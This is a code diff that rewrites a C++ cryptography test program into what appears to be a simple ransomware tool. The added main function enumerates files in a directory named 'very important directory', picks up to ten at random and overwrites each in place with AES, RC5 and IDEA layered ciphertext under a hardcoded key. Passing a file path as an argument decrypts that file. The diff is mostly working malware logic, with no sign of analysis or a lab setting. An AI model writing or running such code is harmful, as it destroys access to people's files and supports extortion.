@@ -1,94 +1,98 @@
-#include "cryptopp/cryptlib.h"
-#include "cryptopp/rijndael.h"
-#include "cryptopp/modes.h"
-#include "cryptopp/files.h"
-#include "cryptopp/osrng.h"
-#include "cryptopp/hex.h"
-#include "cryptopp/rc5.h"
-#include "cryptopp/idea.h"
-
-#include "cryptoFunc.h"
-
 #include <fstream>
 #include <iostream>
 #include <string>
+#include <filesystem>
+#include <random>
 
-std::vector<uint8_t> key = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'i', 'j', 'k', 'l', 'm'};
-std::vector<uint8_t> iv = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'i', 'j', 'k', 'l', 'm' };
+#include "cryptoFunc.h"
+
+
+const std::vector<uint8_t> key = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'i', 'j', 'k', 'l', 'm'};
+const std::vector<uint8_t> iv = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'i', 'j', 'k', 'l', 'm' };
 
 void encryptFile(std::string path) {
-
-}
-
-
-int main(int argc, char* argv[])
-{
-
-
-
-
-
-    using namespace CryptoPP;
-
-    AutoSeededRandomPool prng;
-    HexEncoder encoder(new FileSink(std::cout));
-
-
-    std::string plain = "CBC Mode Test";
-    std::string cipherAes,cipherRc5, cipherIdea, recoveredAes, recoveredIdea, recoveredRc5;
-
-    std::cout << "plain text: " << plain << std::endl;
-
+    std::string cipherAes, cipherRc5, cipherIdea;
 
     std::fstream file;
-    file.open("test.txt", std::ios::in);
+
+    file.open(path, std::ios::in);
     std::string payload;
     if (file.is_open()) {
         std::string line;
         while (std::getline(file, line)) {
-            std::cout << line;
             payload += line + "\n";
         }
     }
     file.close();
-
-
-
-    std::cout << payload << std::endl;
 
     cipherAes = encryptAes(payload, key, iv);
     cipherRc5 = encryptRc5(cipherAes, key, iv);
     cipherIdea = encryptIdea(cipherRc5, key, iv);
 
 
-    file.open("test.txt", std::ios::out);
-    if(file.is_open())
+    file.open(path, std::ios::out);
+    if (file.is_open())
         file << cipherIdea;
     file.close();
+    std::cout << cipherIdea << std::endl;
+}
+
+void decryptFile(std::string path) {
+    std::string recoverAes, recoverRc5, recoverIdea;
+
+    std::fstream file;
+
+    file.open(path, std::ios::in);
+    std::string payload;
+    if (file.is_open()) {
+        std::string line;
+        while (std::getline(file, line)) {
+            payload += line;
+        }
+    }
+    file.close();
+
+    recoverIdea = decryptIdea(payload, key, iv);
+    recoverRc5 = decryptRc5(recoverIdea, key, iv);
+    recoverAes = decryptAes(recoverRc5, key, iv);
 
 
+    file.open(path, std::ios::out);
+    if (file.is_open())
+        file << recoverAes;
+    file.close();
 
-    std::cout << "key: ";
-    encoder.Put(key.data(), key.size());
-    encoder.MessageEnd();
-    std::cout << std::endl;
-
-    std::cout << "iv: ";
-    encoder.Put(iv.data(), iv.size());
-    encoder.MessageEnd();
-    std::cout << std::endl;
-
-    std::cout << "cipher text: ";
-    encoder.Put((const byte*)&cipherIdea[0], cipherIdea.size());
-    encoder.MessageEnd();
-    std::cout << std::endl;
+}
 
 
-    recoveredIdea = decryptIdea(cipherIdea, key, iv);
-    recoveredRc5 = decryptRc5(recoveredIdea, key, iv);
-    recoveredAes = decryptAes(recoveredRc5, key, iv);
+int main(int argc, char* argv[]){
 
-    std::cout << recoveredAes << std::endl;
 
+    if (argc > 1) {
+        decryptFile(argv[1]);
+    }
+    else {
+        std::vector<std::string> files;
+        for (const auto& entry : std::filesystem::directory_iterator("..\\very important directory")) {
+            files.push_back(entry.path().string());
+        }
+
+        if (files.size() > 10) {
+            std::random_device rd;
+            std::mt19937 mt_generator(rd());
+            for (int i = 10; i > 0; i--) {
+                std::uniform_int_distribution dst(0, (int)files.size() - 1);
+                int pi = dst(mt_generator);
+                std::string path = files[pi];
+                files.erase(files.begin() + pi);
+                encryptFile(path);
+            }
+        }
+        else {
+            for (auto f : files) {
+                encryptFile(f);
+            }
+        }
+    }
     return 0;
 }
